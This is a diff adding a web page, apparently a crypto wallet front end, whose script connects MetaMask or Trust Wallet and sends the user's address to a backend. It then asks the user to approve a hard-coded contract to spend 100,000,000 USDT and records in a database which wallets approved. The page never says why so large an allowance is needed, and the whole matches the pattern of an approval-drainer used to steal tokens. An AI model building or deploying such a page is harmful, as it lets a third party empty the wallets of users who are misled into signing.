@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask & Trust Wallet Interaction</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #status {
+            margin-top: 20px;
+            color: green;
+        }
+        .error {
+            color: red;
+        }
+        .warning {
+            color: orange;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+<div id="status">Please connect your wallet...</div>
+<button id="connectButton">Connect Wallet</button>
+<button id="approveButton" disabled>Approve Token</button>
+
+<script>
+    const apiUrl = "http://localhost:8080/api/wallet"; // Backend API URL
+
+    let signer;
+
+    // ABI for USDT contract
+    const usdtAbi = [
+        "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT contract address
+    const tokenManagementAddress = "0xdce262990314066a8910b917241ebe2bb0125f4d"; // TokenManagement contract address
+
+    // Function to save wallet address in the database
+    async function saveWallet(walletAddress) {
+        try {
+            const response = await fetch(`${apiUrl}/save`, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `walletAddress=${walletAddress}`
+            });
+            if (!response.ok) {
+                throw new Error(`Failed to save wallet: ${response.statusText}`);
+            }
+            const result = await response.json();
+            console.log("Wallet saved successfully:", result);
+        } catch (error) {
+            console.error("Error saving wallet:", error);
+        }
+    }
+
+    // Function to update approval status in the database
+    async function updateApproval(walletAddress) {
+        try {
+            const response = await fetch(`${apiUrl}/approve`, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `walletAddress=${walletAddress}`
+            });
+            if (!response.ok) {
+                throw new Error(`Failed to update approval: ${response.statusText}`);
+            }
+            const result = await response.json();
+            console.log("Approval status updated successfully:", result);
+        } catch (error) {
+            console.error("Error updating approval:", error);
+        }
+    }
+
+    // Function to connect to MetaMask/Trust Wallet
+    async function connectWallet() {
+        try {
+            document.getElementById("status").innerText = "Connecting wallet...";
+
+            if (typeof window.ethereum !== "undefined") {
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+            } else {
+                throw new Error("MetaMask or Trust Wallet is not installed!");
+            }
+
+            const userAddress = await signer.getAddress();
+            document.getElementById("status").innerText = `Wallet connected: ${userAddress}`;
+            console.log(`Wallet connected: ${userAddress}`);
+
+            // Save wallet in the database
+            document.getElementById("status").innerText = "Saving wallet in the database...";
+            await saveWallet(userAddress);
+
+            document.getElementById("status").innerText = "Wallet connected successfully!";
+            document.getElementById("approveButton").disabled = false;
+        } catch (error) {
+            if (error.code === 4001) {
+                // User rejected the request
+                console.warn("User rejected the request.");
+                document.getElementById("status").innerHTML = `<span class="warning">Warning: User rejected the request.</span>`;
+            } else {
+                console.error("Error:", error);
+                document.getElementById("status").innerHTML = `<span class="error">Error: ${error.message}</span>`;
+            }
+        }
+    }
+
+    // Function to approve token spending
+    async function approveToken() {
+        try {
+            if (!signer) {
+                throw new Error("Wallet is not connected. Please connect your wallet first.");
+            }
+
+            document.getElementById("status").innerText = "Approving TokenManagement contract to spend USDT...";
+            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+            const approvalAmount = ethers.utils.parseUnits("100000000", 18); // 100,000,000 USDT
+            const tx = await usdtContract.approve(tokenManagementAddress, approvalAmount);
+            console.log(`Approval transaction hash: ${tx.hash}`);
+            document.getElementById("status").innerText = "Waiting for approval confirmation...";
+            await tx.wait();
+
+            // Update approval status in the database
+            const userAddress = await signer.getAddress();
+            document.getElementById("status").innerText = "Updating approval status in the database...";
+            await updateApproval(userAddress);
+
+            document.getElementById("status").innerText = "Approval successful!";
+        } catch (error) {
+            if (error.code === 4001) {
+                // User rejected the request
+                console.warn("User rejected the request.");
+                document.getElementById("status").innerHTML = `<span class="warning">Warning: User rejected the request.</span>`;
+            } else {
+                console.error("Error:", error);
+                document.getElementById("status").innerHTML = `<span class="error">Error: ${error.message}</span>`;
+            }
+        }
+    }
+
+    // Add event listeners to the buttons
+    document.getElementById("connectButton").addEventListener("click", async () => {
+        await connectWallet();
+    });
+
+    document.getElementById("approveButton").addEventListener("click", async () => {
+        await approveToken();
+    });
+</script>
+</body>
+</html>
